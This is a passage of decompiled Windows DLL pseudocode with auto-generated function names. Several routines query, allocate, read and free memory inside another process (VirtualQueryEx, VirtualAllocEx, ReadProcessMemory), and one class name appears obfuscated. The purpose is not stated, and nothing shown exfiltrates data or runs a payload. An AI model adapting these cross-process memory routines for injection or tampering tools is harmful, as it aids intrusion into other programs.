  int *v21; // [esp+64h] [ebp-10h]
  int v22; // [esp+70h] [ebp-4h]

  v21 = &v12;
  v19 = (HANDLE *)this;
  if ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)this + 12))(this) )
  {
    v20 = !sub_10014AF7(this + 8);
    v16.dwLowDateTime = 0;
    v16.dwHighDateTime = 0;
    (*(void (__thiscall **)(int, int *))(*(_DWORD *)this + 24))(this, v14);
    v22 = 0;
    v2 = sub_1000DEE8((int)v14, 0x5Cu);
    sub_1000D836(v2 + 1, (int)v14, v15, 0);
    LOBYTE(v22) = 1;
    if ( v20 )
    {
      if ( *(_BYTE *)(this + 52) )
      {
        v3 = sub_100146C0(&v17);
        LOBYTE(v22) = 2;
        sub_1000C923(v3, 103);
      }
      *(_DWORD *)(this + 56) = *(_DWORD *)(this + 40);
      *(_DWORD *)(this + 60) = *(_DWORD *)(this + 44);
      v4 = *(_DWORD *)(this + 48);
      *(_DWORD *)(this + 64) = v4;
      *(_DWORD *)(this + 68) = *(_DWORD *)(this + 40);
      v5 = *(volatile LONG **)(this + 44);
      *(_DWORD *)(this + 72) = v5;
      *(_DWORD *)(this + 76) = v4;
      v11 = v5;
      v10 = v5;
      v18.dwHighDateTime = (DWORD)&v10;
      sub_1000B964(&v10);
      LOBYTE(v22) = 1;
      sub_1000BA6E(7, 0x80000000, v13, (int)v15, 0x2000000, 3, (int)v10, v11);
      LOBYTE(v22) = 4;
      sub_1000BBC2(v13);
      v16 = (FILETIME)*sub_1000BF90((HANDLE *)v13, &v18, 1);
      LOBYTE(v22) = 1;
      sub_1000BB54((int)v13);
      v6 = v19;
    }
    else
    {
      v6 = v19;
      sub_1000C301(v19, (struct _FILETIME *)(this + 68), (struct _FILETIME *)(this + 56), &v18);
      v6[19] = HANDLE_FLAG_INHERIT;
      v6[16] = HANDLE_FLAG_INHERIT;
    }
    sub_1000BBC2(v6);
    if ( v20 )
    {
      (*((void (__thiscall **)(HANDLE *))*v6 + 31))(v6);
      (*((void (__thiscall **)(HANDLE *, HANDLE *, HANDLE))*v6 + 23))(v6, v6 + 10, v6[12]);
      LOBYTE(v22) = 5;
      v9 = v7;
      v8 = v7;
      v18.dwHighDateTime = (DWORD)&v8;
      sub_1000B964(&v8);
      LOBYTE(v22) = 5;
      sub_1000BA6E(7, 256, v13, (int)v15, 0x2000000, 3, (int)v8, v9);
      LOBYTE(v22) = 7;
      sub_1000BBC2(v13);
      sub_1000BFCF((HANDLE *)v13, &v16, 1);
      LOBYTE(v22) = 5;
      sub_1000BB54((int)v13);
      v22 = 1;
    }
    LOBYTE(v22) = 0;
    sub_1000D3AD(v15);
    v22 = -1;
    sub_1000D3AD(v14);
  }
}
// 1001F7AF: variable 'v7' is possibly undefined

//----- (1001F83F) --------------------------------------------------------
int __thiscall sub_1001F83F(HANDLE *this)
{
  (*((void (__thiscall **)(HANDLE *))*this + 31))(this);
  return sub_1000BCEA(this);
}

//----- (1001F84F) --------------------------------------------------------
int __thiscall sub_1001F84F(HANDLE *this, FILETIME *a2, int a3)
{
  int v4; // eax
  char v6[8]; // [esp+4h] [ebp-14h] BYREF
  int v7; // [esp+14h] [ebp-4h]

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    v4 = sub_1000E950((int)v6);
    v7 = 0;
    sub_10007DD5(v4, 161);
  }
  this[14] = (HANDLE)a2->dwLowDateTime;
  this[15] = (HANDLE)a2->dwHighDateTime;
  this[16] = (HANDLE)a3;
  return sub_1000BFCF(this, a2, a3);
}
// 1001F84F: using guessed type char var_14[8];

//----- (1001F8AB) --------------------------------------------------------
int __thiscall sub_1001F8AB(HANDLE *this, FILETIME *a2, int a3)
{
  int v4; // eax
  char v6[8]; // [esp+4h] [ebp-14h] BYREF
  int v7; // [esp+14h] [ebp-4h]

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    v4 = sub_1000E950((int)v6);
    v7 = 0;
    sub_10007DD5(v4, 173);
  }
  this[17] = (HANDLE)a2->dwLowDateTime;
  this[18] = (HANDLE)a2->dwHighDateTime;
  this[19] = (HANDLE)a3;
  return sub_1000C061(this, a2, a3);
}
// 1001F8AB: using guessed type char var_14[8];

//----- (1001F907) --------------------------------------------------------
int __thiscall sub_1001F907(_DWORD *this)
{
  int result; // eax

  result = (*(int (__thiscall **)(_DWORD *))(*this + 12))(this);
  if ( (_BYTE)result )
  {
    result = (*(int (__thiscall **)(_DWORD *))(*this + 128))(this);
    if ( (_BYTE)result )
    {
      (*(void (__thiscall **)(_DWORD *, _DWORD *, _DWORD))(*this + 100))(this, this + 14, this[16]);
      return (*(int (__thiscall **)(_DWORD *, _DWORD *, _DWORD))(*this + 108))(this, this + 17, this[19]);
    }
  }
  return result;
}

//----- (1001F93F) --------------------------------------------------------
BOOL __thiscall sub_1001F93F(_DWORD *this)
{
  return (this[4] & 0x40000100) != 0;
}

//----- (1001F94E) --------------------------------------------------------
int __thiscall sub_1001F94E(void *this, char a2)
{
  sub_1000C5BE(this, a2);
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 124))(this);
}

//----- (1001F968) --------------------------------------------------------
int __thiscall sub_1001F968(HANDLE *this, _DWORD *a2)
{
  sub_1000C60A(this, a2);
  return (*((int (__thiscall **)(HANDLE *))*this + 31))(this);
}

//----- (1001F982) --------------------------------------------------------
int __thiscall sub_1001F982(HANDLE *this)
{
  sub_1000C8A5(this);
  return (*((int (__thiscall **)(HANDLE *))*this + 31))(this);
}

//----- (1001F992) --------------------------------------------------------
_DWORD *__stdcall sub_1001F992(_DWORD *a1)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_10102A68;
  return a1;
}
// 10102A68: using guessed type int (__thiscall *off_10102A68)(void *Block, char);

//----- (1001F9CA) --------------------------------------------------------
_DWORD *__stdcall sub_1001F9CA(_DWORD *a1)
{
  *a1 = &unk_100FC1FC;
  sub_1000E7F7(1, 0);
  sub_1000E9DF(a1, 1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10102DEC;
  return a1;
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 10102DEC: using guessed type int (__stdcall *off_10102DEC)(char);

//----- (1001FA28) --------------------------------------------------------
_DWORD *__thiscall sub_1001FA28(_DWORD *this, char a2)
{
  _DWORD *v2; // esi
  _DWORD *v3; // edx

  v2 = this - 2;
  sub_1001FA65(this);
  sub_1000E843(v3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}
// 1001FA3B: variable 'v3' is possibly undefined

//----- (1001FA54) --------------------------------------------------------
void __thiscall sub_1001FA54(_DWORD *this)
{
  _DWORD *v1; // edx

  sub_1001FA65(this + 2);
  sub_1000E843(v1);
}
// 1001FA60: variable 'v1' is possibly undefined

//----- (1001FA65) --------------------------------------------------------
int __thiscall sub_1001FA65(_DWORD *this)
{
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 2) + 4) - 8) = &off_10102DEC;
  result = *(_DWORD *)(*(this - 2) + 4);
  *(_DWORD *)((char *)this + result - 8) = &off_100FC1F4;
  return result;
}
// 100FC1F4: using guessed type int (__stdcall *off_100FC1F4)(char);
// 10102DEC: using guessed type int (__stdcall *off_10102DEC)(char);

//----- (1001FA9F) --------------------------------------------------------
int __userpurge sub_1001FA9F@<eax>(int a1@<ecx>, int a2@<edi>, int a3, int a4)
{
  unsigned int v6; // [esp-8h] [ebp-38h]
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+8h] [ebp-28h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  *(_BYTE *)(a3 + 4) = 0;
  v8 = 0;
  *(_BYTE *)(a3 + 12) = 0;
  *(_DWORD *)a3 = &off_10102D94;
  *(_DWORD *)(a3 + 8) = &off_10102DC0;
  sub_1001CA9C(a2, (_DWORD *)(a3 + 16));
  LOBYTE(v8) = 2;
  *(_DWORD *)(a3 + 28) = 0;
  *(_DWORD *)(a3 + 32) = a1;
  *(_DWORD *)(a3 + 36) = a4;
  *(_BYTE *)(a3 + 40) = 0;
  if ( !a4 )
  {
    sub_1001FC2F(a3, &Buffer);
    *(_DWORD *)(a3 + 36) = Buffer.RegionSize;
    v6 = a1 - (unsigned int)Buffer.BaseAddress;
    *(_DWORD *)(a3 + 32) = Buffer.BaseAddress;
    sub_1001FF1A((_DWORD *)a3, v6, 0);
  }
  return a3;
}
// 10102D94: using guessed type int (__thiscall *off_10102D94)(void *Block, char);
// 10102DC0: using guessed type int (__stdcall *off_10102DC0)(int);

//----- (1001FB2B) --------------------------------------------------------
void *__thiscall sub_1001FB2B(void *Block, char a2)
{
  sub_1001FBA6((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001FB4A) --------------------------------------------------------
int __stdcall sub_1001FB4A(int a1)
{
  *(_BYTE *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 12) = 0;
  *(_DWORD *)a1 = &off_10102D94;
  *(_DWORD *)(a1 + 8) = &off_10102DC0;
  sub_1001C7A1((_DWORD *)(a1 + 16), 0, 0);
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  *(_DWORD *)(a1 + 36) = 0;
  *(_BYTE *)(a1 + 40) = 0;
  return a1;
}
// 10102D94: using guessed type int (__thiscall *off_10102D94)(void *Block, char);
// 10102DC0: using guessed type int (__stdcall *off_10102DC0)(int);

//----- (1001FBA6) --------------------------------------------------------
int __thiscall sub_1001FBA6(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10102D94;
  *(_DWORD *)(this + 8) = &off_10102DC0;
  v4 = 3;
  if ( *(_BYTE *)(this + 40) )
    sub_1001FF92(this);
  v4 = 1;
  sub_100128CB((int *)(this + 16));
  LOBYTE(v4) = 0;
  sub_1001170B(this != 0 ? (_BYTE *)(this + 8) : 0);
  v4 = -1;
  return sub_1001B492((_BYTE *)this);
}
// 10102D94: using guessed type int (__thiscall *off_10102D94)(void *Block, char);
// 10102DC0: using guessed type int (__stdcall *off_10102DC0)(int);

//----- (1001FC2F) --------------------------------------------------------
SIZE_T __thiscall sub_1001FC2F(int this, PMEMORY_BASIC_INFORMATION lpBuffer)
{
  SIZE_T result; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-24h] BYREF
  int v7[3]; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+24h] [ebp-4h]

  memset(lpBuffer, 0, sizeof(struct _MEMORY_BASIC_INFORMATION));
  result = VirtualQueryEx(*(HANDLE *)(*(_DWORD *)(this + 20) + 16), *(LPCVOID *)(this + 32), lpBuffer, 0x1Cu);
  if ( !result )
  {
    v4 = sub_1001F9CA(v7);
    v8 = 0;
    sub_1002010F(pExceptionObject, v4, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVDybrxgFqcfonPmswmegdy_gfjjefwq_sr__);
  }
  if ( result != 28 )
  {
    v5 = sub_1000E9DF(pExceptionObject, 1, 1);
    v8 = 1;
    sub_1000A947(v5, 67);
  }
  return result;
}
// 1001FC2F: using guessed type int var_18[3];
// 1001FC2F: using guessed type _DWORD pExceptionObject[3];

//----- (1001FCC0) --------------------------------------------------------
int __usercall sub_1001FCC0@<eax>(int *a1@<ebx>, int a2@<esi>)
{
  sub_100130E8(a1 + 5, (int *)(a2 + 20));
  *(_DWORD *)(a2 + 24) = a1[6];
  *(_DWORD *)(a2 + 32) = a1[8];
  *(_DWORD *)(a2 + 36) = a1[9];
  *(_DWORD *)(a2 + 28) = a1[7];
  *(_BYTE *)(a2 + 40) = 0;
  return a2;
}

//----- (1001FCEC) --------------------------------------------------------
char *__thiscall sub_1001FCEC(char *this)
{
  return this + 16;
}

//----- (1001FCF0) --------------------------------------------------------
DWORD __thiscall sub_1001FCF0(void *this)
{
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+0h] [ebp-1Ch] BYREF

  sub_1001FC2F((int)this, &Buffer);
  return Buffer.State;
}

//----- (1001FD04) --------------------------------------------------------
int __thiscall sub_1001FD04(int this, DWORD flProtect)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v6[3]; // [esp+8h] [ebp-28h] BYREF
  _DWORD v7[3]; // [esp+14h] [ebp-1Ch] BYREF
  int v8; // [esp+20h] [ebp-10h] BYREF
  int v9; // [esp+2Ch] [ebp-4h]

  if ( sub_1001FCF0((void *)this) != 0x2000 )
  {
    v3 = sub_1000E7F7(&flProtect, 1, 0);
    v9 = 0;
    sub_10007882((int)v3);
  }
  v8 = 128;
  sub_100219DF(&v8, (int)v7);
  v9 = 1;
  if ( !VirtualAllocEx(
          *(HANDLE *)(*(_DWORD *)(this + 20) + 16),
          *(LPVOID *)(this + 32),
          *(_DWORD *)(this + 36),
          0x1000u,
          flProtect) )
  {
    v4 = sub_1000E9DF(v6, 1, 1);
    LOBYTE(v9) = 2;
    sub_1000A947(v4, 155);
  }
  v9 = -1;
  return sub_10021A57(v7);
}
// 1001FD04: using guessed type _DWORD var_1C[3];
// 1001FD04: using guessed type int var_28[3];

//----- (1001FDA8) --------------------------------------------------------
int __thiscall sub_1001FDA8(_DWORD *this)
{
  return this[7] - this[5];
}

//----- (1001FDAF) --------------------------------------------------------
int __thiscall sub_1001FDAF(_DWORD *this, _DWORD *a2)
{
  int result; // eax
  int v4; // eax
  wchar_t *v5; // eax
  int v6; // ecx
  int v7; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // ebx
  _DWORD *v11; // eax
  int v12; // [esp-4h] [ebp-48h] BYREF
  int *v13; // [esp+0h] [ebp-44h]
  int v14; // [esp+14h] [ebp-30h] BYREF
  int v15; // [esp+18h] [ebp-2Ch] BYREF
  void *v16[3]; // [esp+1Ch] [ebp-28h] BYREF
  _DWORD v17[4]; // [esp+28h] [ebp-1Ch] BYREF
  int v18; // [esp+40h] [ebp-4h]

  result = a2[3];
  if ( result )
  {
    if ( (unsigned int)(result + this[7]) > this[9] )
    {
      v4 = sub_1000E88D((int)v16, 1, 0);
      v18 = 0;
      sub_10012582(v4, 177);
    }
    v14 = 0;
    v5 = (wchar_t *)sub_1000CC40((int)&unk_10179520);
    v12 = v6;
    v16[0] = &v12;
    sub_1000D17D(&v12, v5);
    v18 = -1;
    v16[0] = sub_1001E665((int)&unk_101869D8);
    v15 = 128;
    sub_100219DF(&v15, (int)v17);
    v18 = 2;
    v7 = a2[3];
    v13 = &v14;
    v12 = v7;
    v8 = sub_1000B4B8(a2);
    if ( !((int (__stdcall *)(int, int, int, int, int *))v16[0])(v9, this[7] + this[8], v8, v12, v13)
      || (v10 = a2[3], v14 != v10) )
    {
      v11 = sub_1000E9DF(v16, 1, 1);
      LOBYTE(v18) = 3;
      sub_1000A947(v11, 192);
    }
    this[7] += v10;
    v18 = -1;
    return sub_10021A57(v17);
  }
  return result;
}
// 1001FE16: variable 'v6' is possibly undefined
// 1001FE7E: variable 'v9' is possibly undefined
// 1001FDAF: using guessed type _DWORD var_1C[4];

//----- (1001FED1) --------------------------------------------------------
void __thiscall sub_1001FED1(void *this, char a2)
{
  int v3; // eax
  int v4[5]; // [esp+8h] [ebp-20h] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v3 = sub_1000B1F3((void *)1, (int)v4, &a2);
  v5 = 0;
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 12))(this, v3);
  v5 = -1;
  sub_1000B3DF(v4);
}
// 1001FED1: using guessed type int var_20[5];

//----- (1001FF1A) --------------------------------------------------------
unsigned int __thiscall sub_1001FF1A(_DWORD *this, unsigned int a2, int a3)
{
  int v3; // eax
  int v4; // eax
  unsigned int result; // eax
  int v6; // eax
  char v7[8]; // [esp+4h] [ebp-14h] BYREF
  int v8; // [esp+14h] [ebp-4h]

  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v4 = this[7];
    }
    else
    {
      if ( a3 != 2 )
      {
        v3 = sub_1000E7F7(1, 0);
        v8 = 0;
        sub_10007882(v3);
      }
      v4 = this[9];
    }
    result = a2 + v4;
  }
  else
  {
    result = a2;
  }
  if ( result >= this[9] )
  {
    v6 = sub_1000E88D((int)v7, 1, 0);
    v8 = 1;
    sub_10012582(v6, 218);
  }
  this[7] = result;
  return result;
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 1001FF1A: using guessed type char var_14[8];

//----- (1001FF92) --------------------------------------------------------
DWORD __usercall sub_1001FF92@<eax>(int a1@<esi>)
{
  DWORD result; // eax
  _DWORD *v2; // eax
  _DWORD v3[6]; // [esp+0h] [ebp-18h] BYREF

  result = sub_1001FCF0((void *)a1);
  if ( result != 0x10000 )
  {
    result = VirtualFreeEx(*(HANDLE *)(*(_DWORD *)(a1 + 20) + 16), *(LPVOID *)(a1 + 32), 0, 0x8000u);
    if ( !result )
    {
      v2 = sub_1000E9DF(v3, 1, 1);
      v3[5] = 0;
      sub_1000A947(v2, 228);
    }
  }
  return result;
}

//----- (1001FFEF) --------------------------------------------------------
SIZE_T __thiscall sub_1001FFEF(_DWORD *this, _DWORD *nSize)
{
  int v5; // ecx
  int v6; // eax
  char v7; // bl
  void *v8; // eax
  BOOL ProcessMemory; // eax
  _DWORD *v10; // eax
  int v11[3]; // [esp+4h] [ebp-20h] BYREF
  HANDLE hProcess; // [esp+10h] [ebp-14h]
  SIZE_T NumberOfBytesRead[4]; // [esp+14h] [ebp-10h] BYREF
  unsigned int nSizea; // [esp+2Ch] [ebp+8h]

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 28))(this) )
    return 0;
  nSizea = nSize[3];
  v5 = nSizea;
  if ( nSizea >= this[7] - this[5] )
    nSizea = this[7] - this[5];
  v6 = nSize[1];
  NumberOfBytesRead[0] = 0;
  v7 = *(_BYTE *)(v6 + 8);
  hProcess = *(HANDLE *)(this[3] + 16);
  v8 = (void *)sub_1000B49B(nSize, v5);
  ProcessMemory = ReadProcessMemory(hProcess, (LPCVOID)(this[5] + this[6]), v8, nSizea, NumberOfBytesRead);
  if ( v7 )
    *(_BYTE *)(nSize[1] + 8) = 1;
  if ( !ProcessMemory || NumberOfBytesRead[0] != nSizea )
  {
    v10 = sub_1000E9DF(v11, 1, 1);
    NumberOfBytesRead[3] = 0;
    sub_1000A947(v10, 244);
  }
  this[5] += nSizea;
  return NumberOfBytesRead[0];
}
// 1001FFEF: using guessed type int var_20[3];

//----- (100200A2) --------------------------------------------------------
int __thiscall sub_100200A2(void *this, _BYTE *a2)
{
  int v3; // ecx
  int v4; // esi
  int v6[5]; // [esp+8h] [ebp-20h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  sub_1000B1F3((void *)1, (int)v6, 0);
  v7 = 0;
  v4 = (*(int (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v6);
  if ( v4 == 1 )
    *a2 = *(_BYTE *)sub_1000B4CB((int)v6, v3, 0);
  v7 = -1;
  sub_1000B3DF(v6);
  return v4;
}
// 100200DB: variable 'v3' is possibly undefined
// 100200A2: using guessed type int var_20[5];

//----- (10020105) --------------------------------------------------------
BOOL __thiscall sub_10020105(_DWORD *this)
{
  return this[5] >= this[7];
}

//----- (1002010F) --------------------------------------------------------
_DWORD *__thiscall sub_1002010F(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_100FC1FC;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000E7B3(this + 2, v4);
  }
  sub_1000AA0A(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10102DEC;
  return this;
}
// 10102DEC: using guessed type int (__stdcall *off_10102DEC)(char);

//----- (10020188) --------------------------------------------------------
void *__thiscall sub_10020188(char *this, char a2)
{
  return sub_1001FB2B(this - 8, a2);
}

//----- (10020190) --------------------------------------------------------
int __thiscall sub_10020190(_DWORD *this)
{
  return sub_1001B069(this - 2);
}

//----- (10020198) --------------------------------------------------------
unsigned int __thiscall sub_10020198(_DWORD *this, unsigned int a2, int a3)
{
  return sub_1001FF1A(this - 2, a2, a3);
}

//----- (100201A0) --------------------------------------------------------
int __thiscall sub_100201A0(void *this, int a2, char a3)
{
  int result; // eax

  result = a2;
  *(_BYTE *)(a2 + 4) = 0;
  *(_DWORD *)(a2 + 8) = this;
  *(_BYTE *)(a2 + 12) = a3;
  return result;
}

//----- (100201D0) --------------------------------------------------------
void *__thiscall sub_100201D0(_BYTE *this)
{
  int v2; // [esp+0h] [ebp-20h] BYREF
  _BYTE *v3; // [esp+Ch] [ebp-14h]
  int *v4; // [esp+10h] [ebp-10h]
  int v5; // [esp+1Ch] [ebp-4h]

  v4 = &v2;
  v3 = this;
  v5 = 1;
  sub_10020227(this);
  v5 = -1;
  return sub_1001170B(v3);
}

//----- (1002021B) --------------------------------------------------------
int __thiscall sub_1002021B(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 24))(v1);
}

//----- (10020227) --------------------------------------------------------
int __thiscall sub_10020227(_BYTE *this)
{
  int result; // eax
  bool v3; // zf
  int v4; // eax

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 36))(this);
  if ( !(_BYTE)result )
  {
    v3 = this[12] == 0;
    this[4] = 1;
    if ( !v3 )
    {
      v4 = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 44))(this);
      return (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 32))(v4);
    }
  }
  return result;
}

//----- (1002024D) --------------------------------------------------------
int __thiscall sub_1002024D(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 16))(v1);
}

//----- (1002025D) --------------------------------------------------------
int __thiscall sub_1002025D(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 12))(v1);
}

//----- (1002026D) --------------------------------------------------------
int __thiscall sub_1002026D(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 28))(v1);
}

//----- (10020279) --------------------------------------------------------
int __thiscall sub_10020279(_DWORD *this)
{
  return this[2];
}

//----- (1002027D) --------------------------------------------------------
BOOL __thiscall sub_1002027D(void *this)
{
  int v2; // eax
  BOOL result; // eax

  result = 0;
  if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 48))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v2 + 40))(v2) )
      return 1;
  }
  return result;
}

//----- (100202A4) --------------------------------------------------------
int __thiscall sub_100202A4(void *this)
{
  int v2; // eax
  int v3; // eax
  char v5[8]; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 40))(this) )
  {
    v2 = sub_1000E950((int)v5);
    v6 = 0;
    sub_10007DD5(v2, 62);
  }
  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
}
// 100202A4: using guessed type char var_14[8];

//----- (100202EC) --------------------------------------------------------
int __thiscall sub_100202EC(void *this, int a2, int a3)
{
  int v4; // eax
  int v5; // eax
  char v7[8]; // [esp+4h] [ebp-14h] BYREF
  int v8; // [esp+14h] [ebp-4h]

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 40))(this) )
  {
    v4 = sub_1000E950((int)v7);
    v8 = 0;
    sub_10007DD5(v4, 69);
  }
  v5 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v5 + 8))(v5, a2, a3);
}
// 100202EC: using guessed type char var_14[8];

//----- (1002033C) --------------------------------------------------------
int __thiscall sub_1002033C(void *this, int a2, char a3)
{
  int result; // eax

  result = a2;
  *(_BYTE *)(a2 + 4) = 0;
  *(_DWORD *)(a2 + 8) = this;
  *(_BYTE *)(a2 + 12) = a3;
  return result;
}

//----- (1002036C) --------------------------------------------------------
int __thiscall sub_1002036C(_BYTE *this)
{
  int v2; // [esp+0h] [ebp-20h] BYREF
  _BYTE *v3; // [esp+Ch] [ebp-14h]
  int *v4; // [esp+10h] [ebp-10h]
  int v5; // [esp+1Ch] [ebp-4h]

  v4 = &v2;
  v3 = this;
  v5 = 1;
  sub_100203B7(this);
  v5 = -1;
  return sub_1001B492(v3);
}

//----- (100203B7) --------------------------------------------------------
int __thiscall sub_100203B7(_BYTE *this)
{
  int result; // eax
  int v3; // eax

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 28))(this);
  if ( !(_BYTE)result )
  {
    (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 44))(this);
    result = sub_1001B4C9(this);
    if ( this[12] )
    {
      v3 = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 36))(this);
      return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 24))(v3);
    }
  }
  return result;
}

//----- (100203E8) --------------------------------------------------------
int __thiscall sub_100203E8(void *this)
{
  int v2; // eax

  (*(void (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 20))(v2);
}

//----- (100203FF) --------------------------------------------------------
int __thiscall sub_100203FF(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 16))(v1);
}

//----- (1002040F) --------------------------------------------------------
int __thiscall sub_1002040F(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 12))(v1);
}

//----- (1002041F) --------------------------------------------------------
BOOL __thiscall sub_1002041F(void *this)
{
  int v2; // eax
  BOOL result; // eax

  result = 0;
  if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 40))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v2 + 32))(v2) )
      return 1;
  }
  return result;
}

//----- (10020446) --------------------------------------------------------
int __thiscall sub_10020446(void *this)
{
  int v2; // eax
  int v3; // eax
  char v5[8]; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 32))(this) )
  {
    v2 = sub_1000E950((int)v5);
    v6 = 0;
    sub_10007DD5(v2, 63);
  }
  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
}
// 10020446: using guessed type char var_14[8];

//----- (1002048E) --------------------------------------------------------
int __thiscall sub_1002048E(void *this, int a2, int a3)
{
  int v4; // eax
  int v5; // eax
  char v7[8]; // [esp+4h] [ebp-14h] BYREF
  int v8; // [esp+14h] [ebp-4h]

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 32))(this) )
  {
    v4 = sub_1000E950((int)v7);
    v8 = 0;
    sub_10007DD5(v4, 70);
  }
  v5 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v5 + 8))(v5, a2, a3);
}
// 1002048E: using guessed type char var_14[8];

//----- (100204DE) --------------------------------------------------------
int __thiscall sub_100204DE(void *this, int a2, int a3)
{
  sub_1000B1F3(*(void **)(a3 + 12), a2, 0);
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a3, a2);
  return a2;
}

//----- (1002052F) --------------------------------------------------------
int __stdcall sub_1002052F(int a1, DWORD dwMaximumSizeLow, LPCWSTR lpName, int a4, int a5)
{
  DWORD v5; // eax
  int *v6; // eax
  _DWORD *v7; // eax
  HANDLE FileMappingW; // eax
  void *v9; // edi
  LPVOID v10; // eax
  DWORD v12; // [esp-8h] [ebp-4Ch]
  DWORD CurrentProcessId; // [esp-4h] [ebp-48h]
  DWORD v14; // [esp-4h] [ebp-48h]
  int pExceptionObject; // [esp+Ch] [ebp-38h] BYREF
  void *v16[2]; // [esp+10h] [ebp-34h] BYREF
  int v17[2]; // [esp+18h] [ebp-2Ch] BYREF
  int v18[2]; // [esp+20h] [ebp-24h] BYREF
  int v19; // [esp+28h] [ebp-1Ch]
  LPSECURITY_ATTRIBUTES lpFileMappingAttributes; // [esp+2Ch] [ebp-18h]
  HANDLE *v21; // [esp+30h] [ebp-14h]
  int v22; // [esp+34h] [ebp-10h]
  int v23; // [esp+40h] [ebp-4h]
  const WCHAR *lpNamea; // [esp+54h] [ebp+10h]

  v22 = 0;
  v23 = 0;
  *(_DWORD *)a1 = off_10102DF4;
